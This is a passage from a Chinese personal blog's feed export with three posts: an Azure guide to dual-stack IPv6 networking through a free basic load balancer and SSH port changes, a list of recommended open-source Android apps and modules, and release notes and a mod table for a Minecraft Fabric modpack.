视为同一标准计费，还很贵，直到最近才<a href="https://azure.microsoft.com/en-us/updates/azure-public-ipv6-offerings-are-free-as-of-july-31">免费开放了 IPv6 的公共 IP</a>（无论基础 SKU 还是标准 SKU）</p><p>Azure VM 实际上支持接入网络接口（NIC）的 IPv6 原生网络，此类教程<a href="https://learn.microsoft.com/zh-cn/azure/virtual-network/ip-services/add-dual-stack-ipv6-vm-portal">文档</a>已有很多了，但接入原生 IPv6 虽然免费， <strong>网络接口绑定的 IPv6 却仅支持标准 SKU</strong> ，而同一网络接口又 <strong>不支持不同类 SKU 的 IP 接入</strong> 。</p><p>这精准的刀法就意味着：除非你部署纯 IPv6 服务，否则只要你需要 IPv4，那 IPv4 就必须也选 标准 SKU，就必须多花一堆钱。</p><p>标准 SKU 的 IP 要按使用时间计费，而且售价不菲。<a href="https://azure.microsoft.com/zh-cn/pricing/details/ip-addresses">$0.005&#x2F;小时</a>相当于一年 $43.8</p><p>那网络接口绑定的 IPv6 既然仅支持标准 SKU，那基本 SKU 的 IPv6 又是干嘛用的呢？<a href="https://learn.microsoft.com/en-us/answers/questions/1467982/unable-to-add-basic-ipv6-to-network-interface">微软的答复</a>是说，可以绑定到基本 SKU 的 负载均衡器 上</p><p>同时可以注意到虽然 标准 SKU 的 负载均衡器 收费，但基本 SKU 的 负载均衡器 同样是<a href="https://azure.microsoft.com/zh-cn/pricing/details/load-balancer">免费</a>的（通过价格计算器可以看到）。那就是说公共 IP 地址也不一定要绑定到 网络接口 上作原生 IP，也可以绑定到 负载均衡器 上，并把 负载均衡器 再绑定到 网络接口 上。把 负载均衡器 作为网络转发器变相支持 IPv6&#x2F;v4 双栈网络</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="配置-虚拟网络、网络接口"><a href="#配置-虚拟网络、网络接口" class="headerlink" title="配置 虚拟网络、网络接口"></a>配置 虚拟网络、网络接口</h3><p>前半段操作和在网络接口上绑定原生 IPv6 是一样的，可以参考<a href="https://learn.microsoft.com/zh-cn/azure/virtual-network/ip-services/add-dual-stack-ipv6-vm-portal">文档</a>。要注意的有：</p><ul><li>添加资源时注意最好加到和虚拟机同个资源组里，放在同个区域，方便管理</li><li>资源相关命名随意，网络接口的主 IP 配置通常不允许重命名</li><li>IPv6 公共 IP 也支持设置一个 xxx.xxx.cloudapp.azure.com 的 DDNS 域名，可以在之前 IPv4 的域名前加个 <code>ipv6-</code> 作为新域名</li><li>文档中地址空间设为了 <code>2404:f800:8000:122::/63</code>，而实际上这设成任意 IPv6 都行，可以搜一个 RFC4193 Generator</li></ul><p>创建公共 IPv6 地址后，在网络接口的 IP 配置中，添加 IPv6 的配置时，如图所示 <strong>不要勾选 公共 IP 地址</strong> 。因为这里要把这个 IP 绑到 负载均衡器上去</p><p><img src="https://cdn.jiecs.top/img/2024/01/Screenshot_20240105-220450_Brave.webp" alt="网络接口 - IP 配置 - Ipv6config"></p><h3 id="创建负载均衡器"><a href="#创建负载均衡器" class="headerlink" title="创建负载均衡器"></a>创建负载均衡器</h3><p>直接搜索，按流程创建 <a href="https://portal.azure.com/#view/Microsoft_Azure_Network/LoadBalancingHubMenuBlade/~/loadBalancers">负载均衡器</a> 即可</p><p>创建时注意：</p><ul><li>SKU 选择 基本，标准型收费</li><li>类型 建议选择 公共。公共 或 内部 的区别参考<a href="https://learn.microsoft.com/zh-cn/azure/load-balancer/basic/overview#load-balancer-types">文档</a>。要注意的是内部型<a href="https://learn.microsoft.com/zh-cn/azure/load-balancer/load-balancer-floating-ip#limitations">完全不支持 IPv6 浮动 IP</a>，而公共型支持非双栈情况下的 IPv6 浮动。创建后无法修改。计费相同</li><li>前端 IP 配置和后端池都可以在创建后修改</li></ul><h3 id="配置负载均衡器"><a href="#配置负载均衡器" class="headerlink" title="配置负载均衡器"></a>配置负载均衡器</h3><p>IPv4&#x2F;v6 双栈需要添加两个前端 IP 配置，分别绑定之前的 IPv4 和 IPv6 公共 IP</p><p><img src="https://cdn.jiecs.top/img/2024/01/Screenshot_20240105-221926_Brave~2.webp" alt="负载均衡器 - 前端 IP 配置"></p><p>因为我们不是真的有多台机子需要负载均衡器来负载均衡，所以 负载均衡规则、运行状况探测 都不需要添加（真的有需求另说）。关键是 <strong>设置 入站 NAT 规则</strong> 把 负载均衡器 当网络转发用</p><p>先在后端池中加入 网络接口的 各 IP 配置。我是把 IPv4 IPv6 拆成了两个后端池：</p><p><img src="https://cdn.jiecs.top/img/2024/01/Screenshot_20240105-223024_Brave.webp" alt="负载均衡器 - 后端池"></p><p>然后最关键的就是在 入站 NAT 规则 里添加你需要的入站规则（即转发哪些流量），浮动 IP 不支持双栈网络中的 IPv6，可参考<a href="https://learn.microsoft.com/zh-cn/azure/load-balancer/load-balancer-floating-ip#limitations">文档</a>。比如这里开放了 222 端口在 IPv4 上 TCP 的流量转发</p><p><img src="https://cdn.jiecs.top/img/2024/01/1704465851948~2.webp" alt="添加 入站 NAT 规则"></p><p>入站 NAT 规则很蛋疼的一点就是没法设置端口范围、IPv4 IPv6 UDP TCP 都要分开设置</p><div class="note note-light">            <p>另外值得注意的是，这与 网络接口 网络安全组 中的安全规则并不冲突或互相影响。流量经负载均衡器转发才能到网络接口上<br>即如要开放流量，那要在 网络安全组 上开放 安全规则 的 <strong>同时</strong> 也在 负载均衡器 上设置对应的 入站 NAT 规则</p>          </div><h3 id="关于-SSH"><a href="#关于-SSH" class="headerlink" title="关于 SSH"></a>关于 SSH</h3><p>配置完这一切后，你会发现你连不上你机器的 SSH 了。不要慌不要怕，这又是想坑你钱的 Azure 在作祟。</p><p>如果按照<a href="https://learn.microsoft.com/zh-cn/azure/load-balancer/basic/quickstart-basic-public-load-balancer-portal">官方文档的快速入门</a>创建负载均衡器，那你会被要求在创建负载均衡器前，先在 虚拟网络 中配置 <a href="https://learn.microsoft.com/zh-cn/azure/bastion/bastion-overview">Azure Bastion</a>，为了所谓的「安全地管理虚拟机」。</p><p>Azure Bastion 即通过一台堡垒管理虚拟网络内的设备，这项服务显然是收费的，且售价不菲。而最为恶心的是，虚拟机用负载均衡器公开的 <strong>SSH 连接必须通过 Bastion 进行</strong> ，否则会说“无法配置先决条件”。直接将公共 IP 地址绑定到 网络接口 上则无此限制。你可以在虚拟机的 连接 页看到这一点：</p><p><img src="https://cdn.jiecs.top/img/2024/01/IMG_20240105_230148_691.webp" alt="无法配置先决条件"></p><p>而这所谓 标准 JIT（just-in-time）策略 还需要 Microsoft Defender for Cloud，参考<a href="https://learn.microsoft.com/zh-cn/azure/defender-for-cloud/just-in-time-access-usage">文档</a>。Azure 处处想忽悠你点钱</p><p>幸运的是，要绕过 Azure 的“安全措施”，你只需要简单地 <strong>把 SSH 端口改掉</strong> 就行了。不要用虚拟机 连接 页上更改端口的功能，可以直接用 串行控制台 更改虚拟机操作系统上的 SSH 配置。如 Ubuntu 是修改 <code>/etc/ssh/sshd_config</code></p><p>把 SSH 端口改成 222 之类的之后，同步修改 网络安全组 上的 安全规则 和负载均衡器 上的 入站 NAT 规则。你还可以在 入站 NAT 规则 中把前端的 22 端口转发到后端的 222 端口上</p><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><p>🎉 连上 SSH 后，你就会发现这台机子已经支持 IPv6 了。现在多数操作系统也不需要你再手动配置 IPv6，可以通过 <code>ifconfig</code> 检查 eth0 是否有 inet6 配置</p><p>出网请求和原生 IPv6 的机子无异。也可通过 <code>ping -6 ip.sb</code> 确认你的 IPv6 可用性</p>]]></content>
    
    
    <categories>
      
      <category>简单教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>技术</tag>
      
      <tag>教程</tag>
      
      <tag>云服务</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>让你的（类）原生安卓和你心意 - 开源解决方案/应用推荐</title>
    <link href="/archives/be95ed72/"/>
    <url>/archives/be95ed72/</url>
    
    <content type="html"><![CDATA[<p>这篇文章适用于那些尝试在国内用 Google Pixel 或 LineageOS 一类 类原生 Android 系统 的用户</p><p>内容包括普通应用、解决方案、Xposed 模块 和 Magisk 模块</p><h2 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h2><h3 id="冻结应用"><a href="#冻结应用" class="headerlink" title="冻结应用"></a>冻结应用</h3><p><strong><a href="https://github.com/aistra0528/Hail">雹（Hail）</a></strong> 是个不错的开源选择，支持的授权方式超级多：<br><img src="https://cdn.jiecs.top/img/2023/09/Screenshot_20230924-194806_%E9%9B%B9.webp" alt="包括 Shizuku、超级用户在内四种授权方式和各种工作模式"></p><p>同时也支持锁屏冻结、创建一键打开的快捷方式</p><h3 id="推送"><a href="#推送" class="headerlink" title="推送"></a>推送</h3><p><strong><a href="https://github.com/fei-ke/HMSPush">HMS Push</a></strong> 是一个开源的三方 HMS Push 接收客户端（Xposed 模块），可以让国产毒瘤即使被冻结也能推送消息，蛮多软件都支持。可以把 HMS Push 的作用域应用到需要推送消息的应用上，来向该应用来伪装自己是华为设备</p><p>值得一提的是，HMS Push 依赖的 HMS Core 显然不开源</p><h3 id="垃圾清理"><a href="#垃圾清理" class="headerlink" title="垃圾清理"></a>垃圾清理</h3><p>实际上，GApps 里的 <strong>文件极客</strong> 自带简易的缓存清理功能，如果对目录系统比较熟悉，大可不必过多的清理软件，文件极客足以</p><p>如果确实需要，那么老牌的开源清理软件 <strong><a href="https://github.com/d4rken-org/sdmaid-se">SD Maid</a></strong> 会是个不错的选择</p><p>如果你觉得 SD Maid 对国内的软件环境显得有点力不从心，那还可以用久负盛名的 <strong><a href="https://www.dircleaner.com/">清浊</a></strong> ，包含丰富的规则、功能和可定制选项。不过，清浊是<em>闭源</em>的，而且部分功能收费（买断 9.9¥）</p><p>此外，还有暴力一点的选项 <strong><a href="https://play.google.com/store/apps/details?id=me.gm.cleaner">质感清理（Material Cleaner）</a></strong> 。这个软件的主要功能类似 存储空间隔离，附带了垃圾清理的功能：<br><img src="https://cdn.jiecs.top/img/2023/09/Screenshot_20230924-201402_Cleaner.webp" alt="Cleaner"><br>它的垃圾清理是直接通过关键词匹配，清理得确实很干净，就是要小心误删。需要注意的是这个软件需要 <em>ROOT 且闭源</em>，隔离存储空间的部分功能收费</p><h3 id="性能调优"><a href="#性能调优" class="headerlink" title="性能调优"></a>性能调优</h3><p>可以选择 <strong><a href="https://github.com/yc9559/uperf">yc&#x2F;Uperf 模块</a></strong> 调优处理器频率、能耗，该作者还有 <strong><a href="https://github.com/yc9559/dfps">Dfps 模块</a></strong> ，同样实用</p><h3 id="数据备份"><a href="#数据备份" class="headerlink" title="数据备份"></a>数据备份</h3><p>Google 提供占用 Google Drive 存储空间的云备份方案。但几乎没法备份应用数据。经常刷机折腾的，一个三方备份软件很有必要</p><p><strong><a href="https://github.com/NeoApplications/Neo-Backup">NeoBackup</a></strong> 就是一个很好的选择，功能多，自定义选择丰富。关键是这类三方备份应用不受 ROM 限制，可以 MIUI 上备份，原生上恢复，非常方便</p><p>这类软件还有 <a href="https://github.com/BaltiApps/Migrate-OSS">Migrate</a>、 Titanium Backup（闭源）等等，但 NeoBackup 算是其中最现代，最稳定好用的了</p><h2 id="实用工具"><a href="#实用工具" class="headerlink" title="实用工具"></a>实用工具</h2><h3 id="日历"><a href="#日历" class="headerlink" title="日历"></a>日历</h3><p>GApps 里的 Google 日历其实已经够用了，唯一的不足就是不支持显示<strong>中国法定节假日的调休</strong>一类内容。实际上，Google 日历支持订阅 .ics 日程文件，所以你可以另辟蹊径导入这些信息</p><ol><li>用电脑或 PC 模式打开 <a href="https://calendar.google.com/">https://calendar.google.com</a>，点右上角的设置齿轮</li><li>找到图示设置：<img src="https://cdn.jiecs.top/img/2023/09/Screenshot_20230924-193442_Brave~2.webp" alt="Google 日历设置 - 添加日历 - 通过网址添加"></li><li>输入 .ics 订阅网址，法定节假日的订阅在网上能找到很多，我是用这个 <a href="https://github.com/lanceliao/china-holiday-calender">lanceliao 的</a>。把 放假 和 补班分成两个日历，就能设成不同颜色显示了</li><li>在 日历 应用客户端上刷新并显示新加的日历：<img src="https://cdn.jiecs.top/img/2023/09/Screenshot_20230924-194100_%E6%97%A5%E5%8E%86.webp" alt="Google 日历"></li></ol><p>另外你还能在 日历设置 - 通用 - 备用日历 里打开<strong>农历显示</strong>。也能根据节假日日程设置提醒，相当于<strong>法节闹钟</strong>的变通办法</p><h3 id="天气"><a href="#天气" class="headerlink" title="天气"></a>天气</h3><p>GApps 的 Google 应用里就能显示天气，然而这天气准不准先不提，UI 是真一言难尽 <img src="https://cdn.jiecs.top/img/2023/09/Screenshot_20230924-191136_Google.webp" alt="Google 天气"></p><p>这里推荐 <strong><a href="https://github.com/WangDaYeeeeee/GeometricWeather">几何天气（GeometricWeather）</a></strong> ，基于 Material Design，可换数据源（彩云天气准确度还不错的）。需要注意的是这个软件在 Github 上目前最新 Release 还是 2022 年 6 月更新的，但 dev 分支的代码仍在<em>相对</em>积极地更新。建议下 Github Actions 产物得到最新的几何天气，如果产物过期了可以 fork 一份用自己的 Github Actions 重新构建</p><p>除了此之外，还有一个基于 几何天气 的 <strong><a href="https://github.com/breezy-weather/breezy-weather">Breezy Weather</a></strong> ，上架 IzzyOnDroid（F-Droid 三方存储库）。Breezy Weather 基本包含几何天气的所有功能，还有一些自己的特色，关键它仍在非常积极地更新</p><h3 id="应用商店"><a href="#应用商店" class="headerlink" title="应用商店"></a>应用商店</h3><p>GApps 中的 Play 商店其实已完全够用，但如果确实有下国内应用的需求，<strong>酷安</strong> 其实就已够用。唯一的问题就是可能因为酷安后端的一些问题，有时只能下到 32 位应用，建议把设置中“安装 32 位包时提示”的选项开起来：<img src="https://cdn.jiecs.top/img/2023/09/Screenshot_20230924-185737_%E9%85%B7%E5%AE%89.webp" alt="酷安设置 - 下载安装"></p><p>此外，要更新、寻找一些开源应用， F-Droid 也是不错的选择。你还可以用 F-Droid 的三方开源客户端： <strong><a href="https://github.com/Droid-ify/client">Droid-ify</a></strong> ，有现代多的 UI 和许多新功能（例如通过 Shizuku 静默安装）</p><h3 id="输入法"><a href="#输入法" class="headerlink" title="输入法"></a>输入法</h3><p>安卓上能用的开源输入法属实不多，这里推荐 <strong><a href="https://github.com/fcitx5-android/fcitx5-android">Fcitx5 for Android</a></strong> ，没有联网功能，基本功能完备，还有些不错的特色功能，能显示 Gbroad 上那种输入法提示。提供 F-Droid 仓库下载</p><p>若是想要便利大于隐私，那闭源选择还有 <strong><a href="https://z.weixin.qq.com/">微信输入法</a></strong> 可用。虽然微信声名狼藉，但它的输入法在原生系统上是还算不错的了，支持跟随系统的振动反馈。而 搜狗、讯飞、百度 的振动都是稀饭</p><h2 id="其他实用应用"><a href="#其他实用应用" class="headerlink" title="其他实用应用"></a>其他实用应用</h2><h3 id="InstallerX"><a href="#InstallerX" class="headerlink" title="InstallerX"></a>InstallerX</h3><p>原生自带的应用包安装器已经够用了，但如果你要更多功能，可以考虑 <strong><a href="https://github.com/iamr0s/InstallerX">InstallerX</a></strong> 。能降级、多用户安装，还能按照规则，搭配酷安实现<em>静默安装</em>等。需要注意的是它 Github 上的源码被归档，但仍在 Telegram 频道中更新，处于半闭源状态</p><h3 id="AppManger"><a href="#AppManger" class="headerlink" title="AppManger"></a>AppManger</h3><p><strong><a href="https://github.com/MuntashirAkon/AppManager">AppManger</a></strong> 是个完全开源的应用，提供和应用管理相关的超级超级多功能</p><p>按功能性来说，相当于</p><ul><li>0.25 个 <a href="https://github.com/LibChecker/LibChecker">LibChecker</a>（库的信息不详）</li><li>0.5 个 <a href="#%E5%86%BB%E7%BB%93%E5%BA%94%E7%94%A8">雹</a>（没法定时冻结）</li><li>1.5 个 <a href="https://github.com/sdex/ActivityManager">Activity Manager</a>（多了创建快捷方式）</li><li>0.5 个 <a href="#InstallerX">InstallerX</a>（没法分应用设置规则）</li><li>0.75 个 <a href="https://github.com/lihenggui/blocker">Blocker</a>（规则库信息不详）</li><li>0.1 个 <a href="https://github.com/RikkaApps/Shizuku">Shizuku</a>（其他应用没法调用）</li><li>3 个 <a href="https://github.com/wingio/Logra">Logra</a>（强大得多）</li><li>0.75 个 <a href="https://appops.rikka.app/">AppOps</a>（没法自动设置规则）</li><li>还有清理垃圾、反编译 dex 等等</li></ul><p>尤其是可以管理应用的各种权限，拦截跟踪器、广告</p>]]></content>
    
    
    <categories>
      
      <category>简单教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>教程</tag>
      
      <tag>Android</tag>
      
      <tag>玩机</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LSOCP Minecraft 整合包升级至最新 1.20.1 - 足迹与故事</title>
    <link href="/archives/f9d2abb9/"/>
    <url>/archives/f9d2abb9/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对<a href="/archives/e47263f6">之前</a>的整合包进行升级，版本支持到 1.20.1。由于也是自用，不考虑同时多版本支持</p><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>LSOCP 指 LightSuperOptClientPack</p><ul><li>懒人包 附带常用光影、资源包（材质），各种模组光影配置已调试好。只需安装即可开玩</li><li>基于 Fabric 且不含 Optfine，使用开源且效果更好的 钠(Sodium) <del>及一堆元素周期表</del>替代。连接材质等特性也有实现</li><li>除了 Minecraft 本体、Xaero 地图系列模组，所有内容物都<strong>开源</strong></li><li>面向客户端，不含向游戏内添加元素的模组</li><li>海量模组，清晰分类命名，整合包内无多余垃圾文件。且有内容物表格</li><li>绝大多数内容均有汉化</li></ul><h2 id="升级内容"><a href="#升级内容" class="headerlink" title="升级内容"></a>升级内容</h2><p>本次整合包不再分发 FULL 版本，即不再内置启动器、游戏本体、Java 运行环境等，只包含标准 MultiMC 整合包格式</p><div class="note note-light">            <p>常规模组版本升级，配置文件变化等不在此列出</p>          </div><h3 id="模组"><a href="#模组" class="headerlink" title="模组"></a>模组</h3><table><thead><tr><th>旧</th><th>新</th><th>备注</th></tr></thead><tbody><tr><td><strong>物品栏HUD+</strong></td><td><strong>耐久信息显示</strong></td><td>开源替代</td></tr><tr><td><strong>Lambda的更好的草方块</strong></td><td>-</td><td>原模组不再支持 Fabric，改用 Fast Better Grass 资源包</td></tr><tr><td><strong>崩溃优化</strong></td><td>-</td><td>兼容性较差</td></tr><tr><td><strong>伤害显示</strong></td><td><strong>Tslat 的伤害显示</strong></td><td>原模组暂不支持 1.20.1</td></tr><tr><td><strong>动态声音滤波器</strong></td><td><strong>物理声效重制版</strong></td><td>原模组暂不支持 1.20.1</td></tr><tr><td><strong>自定义局域网联机</strong></td><td><strong>更高级联机设置</strong></td><td>原模组暂不支持 1.20.1</td></tr><tr><td><strong>无边框全屏</strong></td><td>-</td><td>用不上</td></tr><tr><td><strong>平滑滚动</strong> <strong>界面微调</strong></td><td>-</td><td>维护不积极且兼容性差、没什么用</td></tr><tr><td><strong>Replay Mod</strong> <strong>ViaFabric</strong></td><td>-</td><td>参见<a href="#%E9%80%89%E8%A3%85%E6%A8%A1%E7%BB%84">选装模组</a></td></tr><tr><td><strong>披风</strong></td><td>-</td><td><strong>万用皮肤补丁</strong> 已包含其功能</td></tr><tr><td><strong>星光</strong></td><td>-</td><td>原版客户端的光照引擎已得到足够优化</td></tr><tr><td><strong>DFU载入优化</strong></td><td>原版已包含类似优化</td><td></td></tr><tr><td><strong>C2ME</strong></td><td>-</td><td>对客户端作用不大，<strong>锂</strong> 已包含其功能</td></tr><tr><td>-</td><td><strong>进度信息展示</strong> 等</td><td>添加许多实用模组</td></tr></tbody></table><h3 id="资源包"><a href="#资源包" class="headerlink" title="资源包"></a>资源包</h3><table><thead><tr><th>旧</th><th>新</th><th>备注</th></tr></thead><tbody><tr><td><strong>Masa 系汉化(law4x)</strong></td><td>-</td><td>MasaGadget 已包含</td></tr><tr><td>-</td><td><strong>Fast Better Grass</strong></td><td>类似 Optfine，草方块侧面也有草</td></tr></tbody></table><h3 id="光影"><a href="#光影" class="headerlink" title="光影"></a>光影</h3><table><thead><tr><th>旧</th><th>新</th><th>备注</th></tr></thead><tbody><tr><td><strong>SEUS PTGI</strong>、<strong>AstraLex Shaders</strong></td><td><strong>Rethinking Voxels</strong></td><td>优化光影结构</td></tr></tbody></table><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>整合包为  MultiMC 格式（zip）。以下链接包含多个版本，选择 1.20.1 即可</p><ul><li><a href="http://ctpan.jiecs.top/d/32856022-49594170-e70ac6">城通网盘</a></li><li><a href="https://jiecs-my.sharepoint.com/:f:/g/personal/i_jiecs_top/EuAKe2HDM6tMnv-LonYePj0BcfwlBwmxWaPlOgnCw3Ku6g?e=vDbxDQ">OneDrive</a></li></ul><div class="note note-warning">            <p>模组较多，初次启动可能要较长时间，后续有了疾速加载模组的缓存会快很多</p>          </div><div class="note note-warning">            <p>Linux、MacOS 用户需要将 输入法冲突修复（IMBlocker）模组禁用。该模组只兼容也只为 Windows 设计，直接运行会报缺失 libimm32.so</p>          </div><h2 id="内容物"><a href="#内容物" class="headerlink" title="内容物"></a>内容物</h2><h3 id="模组-1"><a href="#模组-1" class="headerlink" title="模组"></a>模组</h3><h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>ClientCommands</strong> <em>2.8.2</em></td><td>许多实用客户端命令，可实现如附魔钓鱼预测、工具无限耐久</td><td><a href="https://github.com/Earthcomputer/clientcommands">Github</a></td><td>部分作弊性质</td></tr><tr><td><strong>自动钓鱼</strong> Autofish <em>0.9.10</em></td><td>可配置的自动钓鱼</td><td><a href="https://github.com/MrTroot/autofish">Github</a></td><td></td></tr><tr><td><strong>Tweakeroo</strong> <em>0.17.1</em></td><td>许多实用功能，如灵魂出窍、潜影盒预览</td><td><a href="https://github.com/maruohon/tweakeroo/">Github</a> <a href="https://www.curseforge.com/minecraft/mc-mods/tweakeroo">CurseForge</a></td><td>依赖 MaLiLib；部分作弊性质</td></tr><tr><td><strong>投影</strong> Litematica <em>0.15.3</em></td><td>加载结构文件，创建全息蓝图</td><td><a href="https://github.com/maruohon/litematica">Github</a> <a href="https://www.curseforge.com/minecraft/mc-mods/litematica">CurseForge</a></td><td>依赖 MaLiLib</td></tr><tr><td><strong>MasaGadget</strong> <em>3.2-patch2</em></td><td>Masa 系模组增强</td><td><a href="https://github.com/plusls/MasaGadget">Github</a></td><td>依赖 MagicLib</td></tr><tr><td><strong>Xaero的世界地图</strong> Xaero’s World Map <em>1.30.6</em></td><td>自动缓存、性能不错的地图</td><td><a href="https://chocolateminecraft.com/worldmapdownload.php">官网</a> <a href="https://www.curseforge.com/minecraft/mc-mods/xaeros-world-map">CurseForge</a></td><td>闭源</td></tr><tr><td><strong>Xaero的小地图</strong> Xaero’s Minimap <em>23.5.0</em></td><td>联动 Xaero的世界地图 的小地图</td><td><a href="https://www.curseforge.com/minecraft/mc-mods/xaeros-minimap">CurseForge</a></td><td>依赖 Xaero的世界地图；闭源</td></tr><tr><td><strong>一键背包整理Next</strong> Inventory Profiles Next <em>1.10.6</em></td><td>简单的一键背包整理</td><td><a href="https://github.com/blackd/Inventory-Profiles">Github</a></td><td>依赖 libIPN</td></tr><tr><td><strong>更高级联机设置</strong> LAN World Plug-n-Play <em>1.6.5</em></td><td>可自定义局域网联机的端口、正版验证等</td><td><a href="https://github.com/Satxm/mcwifipnp">Github</a></td><td></td></tr><tr><td><strong>缩放</strong> Zoomify <em>5.0.0</em></td><td>C 键放大，可进行许多配置</td><td><a href="https://github.com/isXander/Zoomify">Github</a></td><td>依赖 Fabric Language Kotlin；在 模组菜单中有可配置选项（依赖 YetAnotherConfigLib）</td></tr></tbody></table><h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>Iris Shaders</strong> _1.6.4</td><td>在 Fabric 中与 钠 搭配兼容部分 Optfine 的光影</td><td><a href="https://irisshaders.net/">官网</a> <a href="https://github.com/IrisShaders/Iris">Github</a></td><td>在 模组菜单 或 钠 的视频设置中有可配置选项</td></tr><tr><td><strong>物理声效重制版</strong> DynamicSoundFilters <em>1.1.1</em></td><td>根据场景对游戏音效添加混响等</td><td><a href="https://www.curseforge.com/minecraft/mc-mods/sound-physics-remastered">CurseForge</a> <a href="https://github.com/henkelmax/sound-physics-remastered">Github</a></td><td>在 模组菜单 中有可配置选项</td></tr><tr><td><strong>连接纹理</strong> Continuity <em>3.0.0-beta2</em></td><td>玻璃等材质边缘的连接</td><td><a href="https://github.com/PepperCode1/Continuity">Github</a></td><td>依赖 铟</td></tr><tr><td><strong>更多动画</strong> Not Enough Animations <em>1.6.4</em></td><td>增加如划船、看地图等时的玩家模型动画</td><td><a href="https://github.com/tr7zw/NotEnoughAnimations">Github</a></td><td></td></tr><tr><td><strong>Lambda的动态光源</strong> LambDynamicLights <em>2.3.1</em></td><td>比 Optfine 许多细节更好的动态光源</td><td><a href="https://github.com/LambdAurora/LambDynamicLights">Github</a></td><td>在 模组菜单 中有可配置选项</td></tr></tbody></table><h4 id="显示"><a href="#显示" class="headerlink" title="显示"></a>显示</h4><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>耐久信息显示</strong> Durability Viewer <em>0.83.0-1.10.5</em></td><td>显示盔甲耐久</td><td><a href="https://github.com/gbl/DurabilityViewer">Github</a></td><td>在 模组菜单 中有可配置选项</td></tr><tr><td><strong>Tslat 的伤害显示</strong> TslatEntityStatus <em>1.2.1</em></td><td>显示攻击掉血和生物血条</td><td><a href="https://github.com/Tslat/TslatEntityStatus">Github</a></td><td></td></tr><tr><td><strong>苹果皮</strong> AppleSkin <em>2.5.0</em></td><td>显示饱和度和食物可恢复饥饿值等</td><td><a href="https://github.com/squeek502/AppleSkin">Github</a></td><td>在 模组菜单 中有可配置选项（依赖 Cloth Config API）</td></tr><tr><td><strong>燃料信息</strong> FuelInfo <em>1.0.4</em></td><td>显示燃料&#x2F;烈焰棒剩余可烧物品&#x2F;酿造药水数量</td><td><a href="https://github.com/Luligabi1/FuelInfo">Github</a></td><td></td></tr><tr><td><strong>更好的钠视频设置按钮</strong> Better Sodium Video Settings Button <em>3.0.2</em></td><td>优化视频设置样式，添加部分优化模组配置入口</td><td><a href="https://github.com/LimeShulkerBox/better-sodium-video-settings">Github</a></td><td>依赖 钠</td></tr><tr><td><strong>钠 · 扩展</strong> Sodium Extra <em>0.4.20</em></td><td>为钠添加更多设置，显示 FPS 等</td><td><a href="https://github.com/FlashyReese/sodium-extra-fabric">Github</a></td><td>依赖 钠</td></tr><tr><td><strong>Reeses的钠视频界面</strong> Reese’s Sodium Options <em>1.5.1</em></td><td>使钠视频设置可滚动并添加光影包按钮等</td><td><a href="https://github.com/FlashyReese/reeses-sodium-options">Github</a></td><td>依赖 钠</td></tr><tr><td><strong>更好的F3</strong> BetterF3 <em>7.0.0</em></td><td>多语言、彩色且可自定义的 F3</td><td><a href="https://github.com/cominixo/BetterF3">Github</a></td><td>在 模组菜单 中有可配置选项（依赖 Cloth Config API）</td></tr><tr><td><strong>进度信息展示</strong> Advancementinfo <em>0.83.0</em></td><td>显示进度的具体需要，放大进度界面 UI</td><td><a href="https://github.com/gbl/AdvancementInfo">Github</a></td><td></td></tr></tbody></table><h4 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h4><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>Fabric API</strong> <em>0.85.0</em></td><td>Fabric 基础 API</td><td><a href="https://fabricmc.net/">官网</a> <a href="https://github.com/FabricMC/fabric">Github</a></td><td>移除将导致绝大多数模组无法工作</td></tr><tr><td><strong>模组菜单</strong> Mod Menu <em>7.1.0</em></td><td>模组列表，且是许多模组的配置屏幕 UI</td><td><a href="https://github.com/TerraformersMC/ModMenu">Github</a></td><td>更好的F3、动态FPS 等 9 个模组的配置 GUI 依赖此</td></tr><tr><td><strong>万用皮肤补丁</strong> CustomSkinLoader <em>14.15.2</em></td><td>皮肤补丁</td><td><a href="https://github.com/xfl03/MCCustomSkinLoader">Github</a></td><td></td></tr><tr><td><strong>Cloth Config API</strong> <em>11.1.106</em></td><td>部分模组的配置屏幕 API</td><td><a href="https://github.com/shedaniel/cloth-config">Github</a></td><td>更好的F3、动态FPS 等 3 个模组的配置 GUI 依赖此和模组菜单</td></tr><tr><td><strong>YetAnotherConfigLib</strong> _3.0.3</td><td>更现代的 Cloth Config API</td><td><a href="https://github.com/isXander/YetAnotherConfigLib">Github</a></td><td>更好的树叶渲染优化、缩放 模组的配置 GUI 依赖此和模组菜单</td></tr><tr><td><strong>Architectury API</strong> <em>6.2.43</em></td><td>Forge 和 Fabric 的抽象化调用 API</td><td><a href="https://github.com/architectury/architectury-api">Github</a></td><td>libIPN、缩放 依赖此</td></tr><tr><td><strong>Fabric Language Kotlin</strong> <em>1.10.0</em></td><td>提供 Fabric 中 Kotlin 语言支持的 API</td><td><a href="https://github.com/FabricMC/fabric-language-kotlin">Github</a></td><td>一键背包整理Next、缩放 依赖此</td></tr><tr><td><strong>铟</strong> Indium <em>1.0.21</em></td><td>让 Fabric Render API 与 钠 兼容</td><td><a href="https://github.com/comp500/Indium">Github</a></td><td>连接纹理 依赖此</td></tr><tr><td><strong>MaLiLib</strong> <em>0.16.1</em></td><td>Masa 系模组依赖库</td><td><a href="https://github.com/maruohon/malilib">Github</a> <a href="https://www.curseforge.com/minecraft/mc-mods/malilib">CurseForge</a></td><td>Tweakeroo、投影 等 3 